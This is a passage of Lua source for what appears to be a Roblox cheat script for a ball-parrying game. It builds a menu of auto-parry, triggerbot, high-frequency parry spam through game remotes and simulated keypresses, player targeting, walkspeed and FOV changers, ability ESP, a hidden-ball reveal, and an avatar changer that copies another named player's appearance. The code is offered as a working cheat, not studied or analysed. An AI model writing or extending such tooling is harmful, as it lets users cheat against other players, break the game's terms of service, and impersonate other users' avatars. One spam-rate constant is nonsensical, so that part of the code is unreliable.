        title = "Animation Fix (Remote)",
        flag = "Animation_Fix_AutoParry",
        callback = function(value: boolean)
            autoparrygrabanimation = value
        end
    })

    module:create_checkbox({
        title = "Keypress",
        flag = "Auto_Parry_Keypress",
        callback = function(value: boolean)
            getgenv().AutoParryKeypress = value
        end
    })

local hotkeyModule = rage:create_module({
    title = "AutoCurveHotkey(PC)",
    description = "",
    flag = "hotkey",
    section = "right",
    callback = function(state)
        variables.hotkey = state
        variables.toggles = variables.toggles or {}
        variables.toggles.hotkey = state
    end
})

hotkeyModule:create_checkbox({
    title = "Notify",
    flag = "AutoCurveHotkeyNotify",
    callback = function(value)
        getgenv().AutoCurveHotkeyNotify = value
    end
})

UserInputService.InputBegan:Connect(function(input, processed)
    if processed or not variables.hotkey then return end
    if input.UserInputType == Enum.UserInputType.Keyboard then
        local keyMap = {
            [Enum.KeyCode.One] = "Camera",
            [Enum.KeyCode.Two] = "Random",
            [Enum.KeyCode.Three] = "Dot",
            [Enum.KeyCode.Four] = "Backwards",
            [Enum.KeyCode.Five] = "Slow",
            [Enum.KeyCode.Six] = "Accelerated",
            [Enum.KeyCode.Seven] = "High"
        }

        local newType = keyMap[input.KeyCode]
        if newType then
            current_curve = newType
            variables.curve_type = newType

            if AutoCurveDropdown and AutoCurveDropdown.update then
                AutoCurveDropdown:update(newType)
            end

            if getgenv().AutoCurveHotkeyNotify then
                Library.SendNotification({
                    title = "AutoCurve Changed",
                    text = "New Curve: " .. newType,
                    duration = 3
                })
            end
        end
    end
end)

local playerNames = {}
local playerMap = {}

local function updatePlayerList()
    table.clear(playerNames)
    table.clear(playerMap)

    for _, plr in pairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer and plr:IsDescendantOf(Players) then
            local displayName = plr.DisplayName or "Unknown"
            local username = plr.Name or "Unknown"
            local display = string.format("%s (@%s)", displayName, username)
            table.insert(playerNames, display)
            playerMap[display] = username
        end
    end

    if #playerNames == 0 then
        table.insert(playerNames, "Players.")
    end
end

updatePlayerList()

local targetModule = rage:create_module({
    title = "Player Aim",
    description = "Target a specific player only",
    flag = "targetplayer",
    section = "left",
    callback = function(state)
        variables.targetplayer = state
        variables.toggles = variables.toggles or {}
        variables.toggles.targetplayer = state

        if getgenv().TargetPlayerNotify then
            Library.SendNotification({
                title = "Player Aim Notification",
                text = state and "Player Aim has been turned ON" or "Player Aim has been turned OFF",
                duration = 3
            })
        end
    end
})

targetModule:create_checkbox({
    title = "Notify",
    flag = "TargetPlayerNotify",
    callback = function(value)
        getgenv().TargetPlayerNotify = value
    end
})

local silentSelection = false

local TargetDropdown = targetModule:create_dropdown({
    title = "Select Target",
    flag = "TargetPlayerName",
    options = playerNames,
    multi_dropdown = false,
    maximum_options = 20,
    callback = function(displayString)

        if displayString == "Players." then
            getgenv().SelectedTarget = nil
            return
        end
        
        local realName = playerMap[displayString]
        getgenv().SelectedTarget = realName

        if getgenv().TargetPlayerNotify and not silentSelection then
            Library.SendNotification({
                title = "Target Player",
                text = "Now targeting: " .. (displayString or "None"),
                duration = 3
            })
        end
    end
})

local function refreshDropdown()
    updatePlayerList()

    if TargetDropdown and typeof(TargetDropdown.set_options) == "function" then
        TargetDropdown:set_options(playerNames)

        for display, name in pairs(playerMap) do
            if name == getgenv().SelectedTarget then
                silentSelection = true
                TargetDropdown:update(display)
                silentSelection = false
                break
            end
        end
    end
end

Players.PlayerAdded:Connect(function()
    task.wait(1)
    refreshDropdown()
end)

Players.PlayerRemoving:Connect(function(plr)
    task.wait(1)

    if getgenv().SelectedTarget == plr.Name then
        getgenv().SelectedTarget = nil
        if getgenv().TargetPlayerNotify then
            Library.SendNotification({
                title = "Target Player",
                text = "Selected player left the game.",
                duration = 3
            })
        end
    end

    refreshDropdown()
end)


local TriggerParries = 0
local TriggerbotMode = "Remote"

local function Trigger(ball)
    local Singularity_Cape = LocalPlayer.Character.PrimaryPart:FindFirstChild('SingularityCape')
    if Singularity_Cape then return end
    if TriggerParries > 100 then return end
    if variables.triggerbot_parried then return end

    variables.triggerbot_parried = true
    TriggerParries += 1

    if TriggerbotMode == "Remote" then
        Parry()
    elseif TriggerbotMode == "Keypress" then
        VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, nil)
    end

    task.delay(0.5, function()
        if TriggerParries > 0 then
            TriggerParries -= 1
        end
    end)

    ball:GetAttributeChangedSignal("target"):Once(function()
        variables.triggerbot_parried = false
    end)

    local t0 = tick()
    repeat RunService.Heartbeat:Wait()
    until (tick() - t0 >= 1 or not variables.triggerbot_parried)

    variables.triggerbot_parried = false
end

RunService.Heartbeat:Connect(function()
    if not TriggerBot then return end

    local Singularity_Cape = LocalPlayer.Character.PrimaryPart:FindFirstChild('SingularityCape')
    if Singularity_Cape then return end

    local balls = workspace:FindFirstChild("Balls")
    if not balls then return end

    for _, ball in ipairs(balls:GetChildren()) do
        if ball:IsA("BasePart") and ball:GetAttribute("target") == LocalPlayer.Name then
            Trigger(ball)
            break
        end
    end
end)

local module = rage:create_module({
    title = "Triggerbot",
    description = "Parries instantly if targeted",
    flag = "triggerbot",
    section = "right",
    callback = function(state)
        variables.toggles = variables.toggles or {}
        variables.toggles.triggerbot = state
        TriggerBot = state

        if getgenv().TriggerbotNotify then
            Library.SendNotification({
                title = "Triggerbot Notification",
                text = state and "Triggerbot has been turned ON" or "Triggerbot has been turned OFF",
                duration = 3
            })
        end
    end
})

module:create_checkbox({
    title = "Notify",
    flag = "TriggerbotNotify",
    callback = function(value)
        getgenv().TriggerbotNotify = value
    end
})

module:create_dropdown({
    title = "Trigger Mode",
    flag = "TriggerbotParryMode",
    options = { "Remote", "Keypress" },
    default = "Remote",
    multi_dropdown = false,
    maximum_options = 2,
    callback = function(value)
        TriggerbotMode = value
    end
})

local module = set:create_module({
    title = "ManualSpam",
    description = "High-frequency parry spam",
    flag = "manualspam",
    section = "left",
    callback = function(state)
        variables.toggles = variables.toggles or {}

        if not isMobile then
            variables.toggles.manualspampc = state
        else
            variables.toggles.manualspampc = false
        end

        variables.ManualSpamGuiMobile = state

        if getgenv().ManualSpamNotify then
            Library.SendNotification({
                title = "ManualSpam Notification",
                text = state and "ManualSpam has been turned ON" or "ManualSpam has been turned OFF",
                duration = 3
            })
        end
    end
})

module:create_checkbox({
    title = "Notify",
    flag = "ManualSpamNotify",
    callback = function(value)
        getgenv().ManualSpamNotify = value
    end
})

local manualspam_mode = "nil"
local spamInterval = 1 / 60

module:create_dropdown({
    title = "ManualSpam Mode",
    flag = "manualspam_mode",
    options = {"Remote", "Keypress"},
    default = "Remote",
    multi_dropdown = false,
    maximum_options = 2,
    callback = function(value)
        manualspam_mode = value
    end
})

local fixanimation = false

module:create_checkbox({
    title = "Animation Fix (Remote)",
    flag = "FixAnimation",
    callback = function(value)
        fixanimation = value
    end
})

local adjusted_rate = 33433 * 9e14343423038 * 9e91919191919
spamInterval = 1 / adjusted_rate
local accumulated = 0

RunService.Heartbeat:Connect(function(dt)
    if variables.toggles and variables.toggles.manualspampc then
        local character = LocalPlayer.Character
        if character and character.Parent == workspace:FindFirstChild("Alive") then
            accumulated = accumulated + dt
            if accumulated >= spamInterval then
                accumulated = 0
                if manualspam_mode == "Remote" then
                    spam()
                    if fixanimation then
                        PF()
                    end
                elseif manualspam_mode == "Keypress" then
                    VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game)
                    VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.F, false, game)
                end
            end
        end
    end
end)

local lastGuiPosition = nil

RunService.Heartbeat:Connect(function()
    if isMobile and variables and variables.ManualSpamGuiMobile then
        if not _G.ManualSpamMobileUI then
            local CoreGui = game:GetService("CoreGui")
            local UserInputService = game:GetService("UserInputService")

            local gui = Instance.new("ScreenGui")
            gui.Name = "ManualSpamMobileUI"
            gui.ResetOnSpawn = false
            gui.IgnoreGuiInset = true
            gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

            local button = Instance.new("TextButton")
            button.Size = UDim2.new(0, 160, 0, 60)
            button.Position = lastGuiPosition or UDim2.new(0.5, -80, 0.8, 0)
            button.BackgroundTransparency = 1
            button.AnchorPoint = Vector2.new(0.5, 0)
            button.Active = true
            button.Draggable = true
            button.AutoButtonColor = false
            button.BorderSizePixel = 0
            button.ZIndex = 2

            local backgroundFrame = Instance.new("Frame")
            backgroundFrame.Size = UDim2.new(1, 0, 1, 0)
            backgroundFrame.Position = UDim2.new(0, 0, 0, 0)
            backgroundFrame.BackgroundTransparency = 0
            backgroundFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
            backgroundFrame.ZIndex = 1
            backgroundFrame.Parent = button

            local gradient = Instance.new("UIGradient")
            gradient.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0.00, Color3.fromRGB(0, 0, 0)),
                ColorSequenceKeypoint.new(0.1, Color3.fromRGB(15, 15, 15)),
                ColorSequenceKeypoint.new(0.25, Color3.fromRGB(45, 45, 45)),
                ColorSequenceKeypoint.new(0.55, Color3.fromRGB(90, 90, 90)),
                ColorSequenceKeypoint.new(0.77, Color3.fromRGB(180, 180, 180)),
                ColorSequenceKeypoint.new(0.88, Color3.fromRGB(225, 225, 225)),
                ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255)),
            })
            gradient.Rotation = -45
            gradient.Transparency = NumberSequence.new(0.05)
            gradient.Parent = backgroundFrame

            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 12)
            corner.Parent = backgroundFrame

            local stroke = Instance.new("UIStroke")
            stroke.Color = Color3.fromRGB(255, 255, 255)
            stroke.Thickness = 1.5
            stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
            stroke.Transparency = 0.2
            stroke.Parent = backgroundFrame

            local text = Instance.new("TextLabel")
            text.Size = UDim2.new(1, 0, 1, 0)
            text.Position = UDim2.new(0, 0, 0, 0)
            text.BackgroundTransparency = 1
            text.Text = "Spam"
            text.Font = Enum.Font.FredokaOne
            text.TextSize = 22
            text.TextColor3 = Color3.fromRGB(255, 255, 255)
            text.ZIndex = 3
            text.Parent = button

            button.Parent = gui
            gui.Parent = CoreGui

            _G.ManualSpamMobileUI = gui
            _G.ManualSpamButton = button

            local function updateText()
                text.Text = variables.toggles.manualspampc and "ON" or "Spam"
            end

            local isDragging = false
            local touchStartPos = nil
            local touchStartTime = 0
            local DRAG_THRESHOLD = 15
            local TOUCH_TIME_THRESHOLD = 0.3

            button.InputBegan:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    isDragging = false
                    touchStartPos = input.Position
                    touchStartTime = tick()
                end
            end)

            button.InputChanged:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                    if touchStartPos then
                        local currentPos = input.Position
                        local distance = (currentPos - touchStartPos).Magnitude

                        if distance > DRAG_THRESHOLD then
                            isDragging = true
                        end
                    end
                end
            end)

            button.InputEnded:Connect(function(input)
                if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                    local touchEndTime = tick()
                    local touchDuration = touchEndTime - touchStartTime

                    if not isDragging and touchDuration <= TOUCH_TIME_THRESHOLD then
                        variables.toggles.manualspampc = not variables.toggles.manualspampc
                        updateText()
                        if getgenv().ManualSpamNotify then
                            Library.SendNotification({
                                title = "ManualSpam Notification",
                                text = variables.toggles.manualspampc and "ManualSpam has been turned ON" or "ManualSpam has been turned OFF",
                                duration = 3
                            })
                        end
                    end
                    
                    touchStartPos = nil
                    touchStartTime = 0
                    isDragging = false
                end
            end)

            button:GetPropertyChangedSignal("Position"):Connect(function()
                lastGuiPosition = button.Position
            end)
        end
    else
        if _G.ManualSpamMobileUI then
            if _G.ManualSpamButton then
                lastGuiPosition = _G.ManualSpamButton.Position
            end
            _G.ManualSpamMobileUI:Destroy()
            _G.ManualSpamMobileUI = nil
            _G.ManualSpamButton = nil
        end
    end
end)


    local SpamParry = set:create_module({
        title = 'Auto Spam',
        flag = 'Auto_Spam_Parry',
        description = 'Automatically spam parries ball',
        section = 'right',
        callback = function(value: boolean)
            getgenv().AutoSpamTopTop = value
            
            if getgenv().AutoSpamNotify then
                if value then
                    Library.SendNotification({
                        title = "Auto Spam Notification",
                        text = "Auto Spam turned ON",
                        duration = 3
                    })
                else
                    Library.SendNotification({
                        title = "Auto Spam Notification",
                        text = "Auto Spam turned OFF",
                        duration = 3
                    })
                end
            end

            if value then
                Connections_Manager['Auto Spam'] = RunService.PreSimulation:Connect(function()
                    local Ball = Auto_Parry.Get_Ball()

                    if not Ball then
                        return
                    end

                    local Zoomies = Ball:FindFirstChild('zoomies')

                    if not Zoomies then
                        return
                    end

                    Auto_Parry.Closest_Player()

                    local Ping = game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()

                    local Ping_Threshold = math.clamp(Ping / 10, 1, 16)

                    local Ball_Target = Ball:GetAttribute('target')

                    local Ball_Properties = Auto_Parry:Get_Ball_Properties()
                    local Entity_Properties = Auto_Parry:Get_Entity_Properties()

                    local Spam_Accuracy = Auto_Parry.Spam_Service({
                        Ball_Properties = Ball_Properties,
                        Entity_Properties = Entity_Properties,
                        Ping = Ping_Threshold
                    })

                    local Target_Position = Closest_Entity.PrimaryPart.Position
                    local Target_Distance = Player:DistanceFromCharacter(Target_Position)

                    local Direction = (Player.Character.PrimaryPart.Position - Ball.Position).Unit
                    local Ball_Direction = Zoomies.VectorVelocity.Unit

                    local Dot = Direction:Dot(Ball_Direction)

                    local Distance = Player:DistanceFromCharacter(Ball.Position)

                    if not Ball_Target then
                        return
                    end

                    if Target_Distance > Spam_Accuracy or Distance > Spam_Accuracy then
                        return
                    end
                    
                    local Pulsed = Player.Character:GetAttribute('Pulsed')

                    if Pulsed then
                        return
                    end

                    if Ball_Target == tostring(Player) and Target_Distance > 30 and Distance > 30 then
                        return
                    end

                    local threshold = ParryThreshold

                    if Distance <= Spam_Accuracy and Parries > threshold then
                        if getgenv().SpamParryKeypress then
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.F, false, game) 
                        else
                            spam()
                        end
                    end
                end)
            else
                if Connections_Manager['Auto Spam'] then
                    Connections_Manager['Auto Spam']:Disconnect()
                    Connections_Manager['Auto Spam'] = nil
                end
            end
        end
    })

    SpamParry:create_checkbox({
        title = "Notify",
        flag = "Auto_Spam_Parry_Notify",
        callback = function(value: boolean)
            getgenv().AutoSpamNotify = value
        end
    })

    SpamParry:create_slider({
        title = "Parry Threshold",
        flag = "Parry_Threshold",
        maximum_value = 3,
        minimum_value = 1,
        value = 2,
        round_number = true,
        callback = function(value: number)
            ParryThreshold = value
        end
    })

    SpamParry:create_divider({
    })

SpamParry:create_checkbox({
    title = "Animation Fix",
    flag = "AnimationFix",
    callback = function(value: boolean)
        if value then
            Connections_Manager['Animation Fix'] = RunService.PreSimulation:Connect(function()
                local Ball = Auto_Parry.Get_Ball()

                if not Ball then return end

                local Zoomies = Ball:FindFirstChild('zoomies')
                if not Zoomies then return end

                Auto_Parry.Closest_Player()

                local Ping = game:GetService('Stats').Network.ServerStatsItem['Data Ping']:GetValue()
                local Ping_Threshold = math.clamp(Ping / 10, 10, 16)

                local Ball_Target = Ball:GetAttribute('target')

                local Ball_Properties = Auto_Parry:Get_Ball_Properties()
                local Entity_Properties = Auto_Parry:Get_Entity_Properties()

                local Spam_Accuracy = Auto_Parry.Spam_Service({
                    Ball_Properties = Ball_Properties,
                    Entity_Properties = Entity_Properties,
                    Ping = Ping_Threshold
                })

                local Target_Position = Closest_Entity.PrimaryPart.Position
                local Target_Distance = Player:DistanceFromCharacter(Target_Position)

                local Direction = (Player.Character.PrimaryPart.Position - Ball.Position).Unit
                local Ball_Direction = Zoomies.VectorVelocity.Unit

                local Dot = Direction:Dot(Ball_Direction)
                local Distance = Player:DistanceFromCharacter(Ball.Position)

                if not Ball_Target then return end
                if Target_Distance > Spam_Accuracy or Distance > Spam_Accuracy then return end
                if Player.Character:GetAttribute('Pulsed') then return end
                if Ball_Target == tostring(Player) and Target_Distance > 30 and Distance > 30 then return end

                local threshold = ParryThreshold
                if Distance <= Spam_Accuracy and Parries > threshold then
                    PF()
                end
            end)
        else
            if Connections_Manager['Animation Fix'] then
                Connections_Manager['Animation Fix']:Disconnect()
                Connections_Manager['Animation Fix'] = nil
            end
        end
    end
})


    SpamParry:create_checkbox({
        title = "Keypress",
        flag = "Auto_Spam_Parry_Keypress",
        callback = function(value: boolean)
            getgenv().SpamParryKeypress = value
        end
    })


getgenv().avatarChangerActive = false
getgenv().targetUser = ""

local isAvatarOriginal = true
local originalDesc
local currentDesc
local lastUser
local addedCon

local function setAvatar(char)
    if not char then return end
    
    local hum = char:WaitForChild("Humanoid", 5)
    char:WaitForChild("HumanoidRootPart", 5)

    if Player.HasAppearanceLoaded and not Player:HasAppearanceLoaded() then
        Player.CharacterAppearanceLoaded:Wait()
    end
    
    task.wait(0.5)
    
    if not originalDesc then
        originalDesc = hum:GetAppliedDescription()
    end

    if hum and currentDesc then
        if not char.Parent then return end
        
        Player:ClearCharacterAppearance()

        RunService.Heartbeat:Wait()
        
        hum:ApplyDescriptionClientServer(currentDesc)
        isAvatarOriginal = false
    end
end

local function resetAvatar()
    if addedCon then
        addedCon:Disconnect()
        addedCon = nil
    end

    local char = Player.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    
    if hum and originalDesc and not isAvatarOriginal then
        Player:ClearCharacterAppearance()

        RunService.Heartbeat:Wait()
        
        hum:ApplyDescriptionClientServer(originalDesc)
        isAvatarOriginal = true
    end
end

local function applyAvatarFromUsername(username)
    if not username or username == "" then return end
    
    local userId
    local success, result = pcall(function()
        return Players:GetUserIdFromNameAsync(username)
    end)
    
    if success then
        userId = result
    else
        warn("[AvatarChanger] Invalid username: " .. username)
        return
    end

    if lastUser and lastUser == userId then
        return
    end
    lastUser = userId
    
    local descSuccess, desc = pcall(function()
        return Players:GetHumanoidDescriptionFromUserId(userId)
    end)
    
    if descSuccess and desc then
        currentDesc = desc
        
        if Player.Character then
            setAvatar(Player.Character)
        end

        if addedCon then addedCon:Disconnect() end
        addedCon = Player.CharacterAdded:Connect(function(char)

            task.spawn(function()
                setAvatar(char)
            end)
        end)
    else
        warn("[AvatarChanger] Error getting avatar description for user: " .. username)
    end
end

local AvatarChanger = pl:create_module({
    title = 'Avatar Changer',
    flag = 'AvatarChanger',
    description = 'Change your avatar to another player',
    section = 'left',
    callback = function(enabled)
        getgenv().avatarChangerActive = enabled

        if enabled then
            if getgenv().targetUser and getgenv().targetUser ~= "" then
                applyAvatarFromUsername(getgenv().targetUser)
            end
        else
            resetAvatar()

            currentDesc = nil
            lastUser = nil
        end
    end
})

AvatarChanger:create_textbox({
    title = "Target Username",
    placeholder = "Enter Username...",
    flag = "AvatarChangerTextbox",
    callback = function(username)
        getgenv().targetUser = username
        
        if getgenv().avatarChangerActive then
            applyAvatarFromUsername(username)
        end
    end
})

task.spawn(function()
    task.wait(1)
    
    if getgenv().avatarChangerActive and getgenv().targetUser and getgenv().targetUser ~= "" then
        applyAvatarFromUsername(getgenv().targetUser)
    end
end)

local VictoryScreen = playerGui:WaitForChild("VictoryScreen")

task.spawn(function()
    while true do
        if VictoryScreen.Enabled then
            local returnToLobby = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("ReturnToLobby")
            returnToLobby:FireServer()
            break
        else

        end
        task.wait(1)
    end
end)


local CameraToggle = pl:create_module({
    title = 'FOV',
    flag = 'FOV',
    
    description = 'Changes Camera POV',
    section = 'left',
    
    callback = function(value)
        getgenv().CameraEnabled = value
        local Camera = game:GetService("Workspace").CurrentCamera
    
        if value then
            getgenv().CameraFOV = getgenv().CameraFOV or 70
            Camera.FieldOfView = getgenv().CameraFOV
                
            if not getgenv().FOVLoop then
                getgenv().FOVLoop = game:GetService("RunService").RenderStepped:Connect(function()
                    if getgenv().CameraEnabled then
                        Camera.FieldOfView = getgenv().CameraFOV
                    end
                end)
            end
        else
            Camera.FieldOfView = 70
                
            if getgenv().FOVLoop then
                getgenv().FOVLoop:Disconnect()
                getgenv().FOVLoop = nil
            end
        end
    end
})
    
CameraToggle:create_slider({
    title = 'Camera FOV',
    flag = 'Camera_FOV',
    
    maximum_value = 120,
    minimum_value = 50,
    value = 70,
    
    round_number = true,
    
    callback = function(value)
        getgenv().CameraFOV = value
        if getgenv().CameraEnabled then
            game:GetService("Workspace").CurrentCamera.FieldOfView = value
        end
    end
})

local WalkspeedToggle = pl:create_module({
    title = 'Walkspeed',
    flag = 'Walkspeed',
    description = 'Walkspeed Changer',
    section = 'right',

    callback = function(value)
        getgenv().WalkspeedEnabled = value

        if value then
            if not getgenv().WalkspeedConnection then
                getgenv().OriginalWalkspeed = nil
                getgenv().WalkspeedConnection = RunService.Heartbeat:Connect(function()
                    local char = LocalPlayer.Character
                    if not char or not char:FindFirstChild("Humanoid") then return end

                    if not getgenv().OriginalWalkspeed then
                        getgenv().OriginalWalkspeed = char.Humanoid.WalkSpeed
                    end

                    char.Humanoid.WalkSpeed = getgenv().WalkspeedValue or 36
                end)
            end
        else
            if getgenv().WalkspeedConnection then
                getgenv().WalkspeedConnection:Disconnect()
                getgenv().WalkspeedConnection = nil

                local char = LocalPlayer.Character
                if char and char:FindFirstChild("Humanoid") and getgenv().OriginalWalkspeed then
                    char.Humanoid.WalkSpeed = getgenv().OriginalWalkspeed
                end
                getgenv().OriginalWalkspeed = nil
            end
        end
    end
})

WalkspeedToggle:create_slider({
    title = 'Walkspeed Value',
    flag = 'WalkspeedValue',
    maximum_value = 300,
    minimum_value = 36,
    value = 36,
    round_number = true,

    callback = function(value)
        getgenv().WalkspeedValue = value

        if getgenv().WalkspeedEnabled then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("Humanoid") then
                char.Humanoid.WalkSpeed = value
            end
        end
    end
})

local function GetBall()
    local folder = workspace:FindFirstChild("Balls")
    if not folder then return {} end
    local balls = {}
    for _, b in pairs(folder:GetChildren()) do
        if b:GetAttribute("realBall") then
            table.insert(balls, b)
        end
    end
    return balls
end

local plr = Players.LocalPlayer

local billboardLabels = {}

function qolPlayerNameVisibility()
    local function createBillboardGui(p)
        local character = p.Character
        while not (character and character.Parent) do
            task.wait()
            character = p.Character
        end

        local head = character:WaitForChild("Head")
        local billboardGui = Instance.new("BillboardGui")
        billboardGui.Name = "AbilityESPGui"
        billboardGui.Adornee = head
        billboardGui.Size = UDim2.new(0, 200, 0, 40)
        billboardGui.StudsOffset = Vector3.new(0, 3.2, 0)
        billboardGui.AlwaysOnTop = true
        billboardGui.Parent = head

        local textLabel = Instance.new("TextLabel")
        textLabel.Size = UDim2.new(1, 0, 1, 0)
        textLabel.BackgroundTransparency = 1
        textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        textLabel.TextStrokeTransparency = 0.5
        textLabel.Font = Enum.Font.GothamBold
        textLabel.TextSize = 14
        textLabel.TextWrapped = true
        textLabel.TextXAlignment = Enum.TextXAlignment.Center
        textLabel.TextYAlignment = Enum.TextYAlignment.Center
        textLabel.Parent = billboardGui

        billboardLabels[p] = textLabel

        local humanoid = character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
        end

        local heartbeatConnection
        heartbeatConnection = RunService.Heartbeat:Connect(function()
            if not (character and character.Parent) then
                heartbeatConnection:Disconnect()
                billboardGui:Destroy()
                billboardLabels[p] = nil
                return
            end

            if getgenv().AbilityESP then
                textLabel.Visible = true
                local abilityName = p:GetAttribute("EquippedAbility")
                if abilityName then
                    textLabel.Text = p.DisplayName .. "  [" .. abilityName .. "]"
                else
                    textLabel.Text = p.DisplayName
                end
            else
                textLabel.Visible = false
            end
        end)
    end

    for _, p in Players:GetPlayers() do
        if p ~= plr then
            p.CharacterAdded:Connect(function()
                createBillboardGui(p)
            end)
            createBillboardGui(p)
        end
    end

    Players.PlayerAdded:Connect(function(newPlayer)
        newPlayer.CharacterAdded:Connect(function()
            createBillboardGui(newPlayer)
        end)
    end)
end

qolPlayerNameVisibility()

visuals:create_module({
    title = 'Ability ESP',
    flag = 'AbilityESP',
    description = 'Displays Player Abilities',
    section = 'left',
    callback = function(value)
        getgenv().AbilityESP = value
        for _, label in pairs(billboardLabels) do
            label.Visible = value
        end
    end
})


local ballvelocityGui
local showingvelocity = false
local peakVelocities = {}
local labelTask

local function updateLabelText(label, text)
    label.Text = text
end

function createOutlinedLabel(parent, yPos)
    local container = Instance.new("Frame")
    container.Size = UDim2.new(1, 0, 0, 30)
    container.Position = UDim2.new(0, 0, 0, yPos)
    container.BackgroundTransparency = 1
    container.Parent = parent

    local function newLabel(offsetX, offsetY, color, isOutline)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(1, 0, 1, 0)
        lbl.Position = UDim2.new(0, offsetX, 0, offsetY)
        lbl.BackgroundTransparency = 1
        lbl.TextColor3 = color
        lbl.TextScaled = true
        lbl.Font = Enum.Font.Roboto
        lbl.Text = isOutline and "" or "Waiting..."
        lbl.TextStrokeTransparency = isOutline and 0 or 0.5
        lbl.TextStrokeColor3 = Color3.new(0, 0, 0)
        lbl.Parent = container
        return lbl
    end

    local outlineOffsets = {
        {x = -1, y = 0},
        {x = 1, y = 0},
        {x = 0, y = -1},
        {x = 0, y = 1},
    }
    for _, offset in ipairs(outlineOffsets) do
        newLabel(offset.x, offset.y, Color3.new(0, 0, 0), true)
    end
    local mainLabel = newLabel(0, 0, Color3.new(1, 1, 1), false)

    return mainLabel
end

function updatelabel(labelTable)
    while showingvelocity do
        task.wait()
        local targetBalls = GetBall()
        local currentBallsSet = {}
        for _, ball in ipairs(targetBalls) do
            currentBallsSet[ball] = true
        end
        for ball in pairs(peakVelocities) do
            if not currentBallsSet[ball] then
                peakVelocities[ball] = nil
            end
        end
        if #targetBalls > 0 then
            for i, ball in ipairs(targetBalls) do
                if ball and ball:IsA("BasePart") then
                    local velocity = ball.AssemblyLinearVelocity.Magnitude
                    updateLabelText(labelTable[i], string.format("Ball %d Speed: %.0f", i, velocity))
                    if not peakVelocities[ball] or velocity > peakVelocities[ball] then
                        peakVelocities[ball] = velocity
                    end
                    updateLabelText(labelTable[#targetBalls + i], string.format("Ball %d Max Speed: %.0f", i, peakVelocities[ball]))
                end
            end
            for j = (#targetBalls * 2) + 1, #labelTable do
                updateLabelText(labelTable[j], "")
            end
        else
            updateLabelText(labelTable[1], "Waiting...")
            for i = 2, #labelTable do
                updateLabelText(labelTable[i], "")
            end
        end
    end
end

visuals:create_module({
    title = "Ball Velocity",
    description = "Displays the ball’s speed",
    flag = "ballvelocity",
    section = "right",
    callback = function(state)
        showingvelocity = state
        peakVelocities = {}
        if showingvelocity then
            if not ballvelocityGui then
                ballvelocityGui = Instance.new("ScreenGui")
                ballvelocityGui.Name = "BallVelocityGui"
                ballvelocityGui.ResetOnSpawn = false
                ballvelocityGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(0, 200, 0, 130)
                frame.Position = UDim2.new(1, -260, 0, 180)
                frame.BackgroundTransparency = 1
                frame.Parent = ballvelocityGui

                local labelTable = {}
                for i = 0, 3 do
                    local y = i * 30
                    table.insert(labelTable, createOutlinedLabel(frame, y))
                end

                labelTask = task.spawn(updatelabel, labelTable)
            end
        else
            if labelTask then
                task.cancel(labelTask)
                labelTask = nil
            end
            if ballvelocityGui then
                ballvelocityGui:Destroy()
                ballvelocityGui = nil
            end
        end
    end
})

getgenv().ShowRealBall = false
local module = visuals:create_module({
    title = "Show realBall",
    description = "Reveals the real ball",
    flag = "Show_realBall",
    section = "left",
    callback = function(state)
        getgenv().ShowRealBall = state
    end
})

task.spawn(function()
    while true do
        task.wait(0.2)
        if not workspace:FindFirstChild("Balls") then continue end
        for _, obj in pairs(workspace.Balls:GetChildren()) do
            if obj:IsA("BasePart") then
                local isRealBall = obj:GetAttribute("realBall")
                if isRealBall == true then
                    if getgenv().ShowRealBall then
                        obj.Transparency = 0
                        obj.Color = Color3.fromRGB(0, 255, 0)
                        if not obj:FindFirstChild("UwUHighlight") then
                            local hl = Instance.new("Highlight")
                            hl.Name = "UwUHighlight"
                            hl.FillColor = Color3.fromRGB(0, 255, 0)
                            hl.OutlineColor = Color3.fromRGB(0, 255, 0)
                            hl.Adornee = obj
                            hl.Parent = obj
                        end
                    else
                        obj.Transparency = 1
                        local hl = obj:FindFirstChild("UwUHighlight")
                        if hl then hl:Destroy() end
                    end
                end
            end
        end
    end
end)

local onlyrealball = false
module:create_checkbox({
    title = "Only realBall",
    flag = "Only_realBall",
    callback = function(value)
        onlyrealball = value
    end
})

task.spawn(function()
    while true do
        task.wait(0.2)
        if not workspace:FindFirstChild("Balls") then continue end
        for _, obj in pairs(workspace.Balls:GetChildren()) do
            if obj:IsA("BasePart") then
                local isRealBall = obj:GetAttribute("realBall")
                if getgenv().ShowRealBall and onlyrealball then
                    if not isRealBall then
                        obj.Transparency = 1
                    end
                elseif not isRealBall then
                    obj.Transparency = 0
                end
            end
        end
    end
end)

local skytoggleac = false
local selectedSkyOption = "Default"

local Lighting = cloneref(game:GetService('Lighting'))

local skyFaces = {"SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp"}

local skys = {
    ["Default"] = {"591058823", "591059876", "591058104", "591057861", "591057625", "591059642"},
    ["Vaporwave"] = {"1417494030", "1417494146", "1417494253", "1417494402", "1417494499", "1417494643"},
    ["Redshift"] = {"401664839", "401664862", "401664960", "401664881", "401664901", "401664936"},
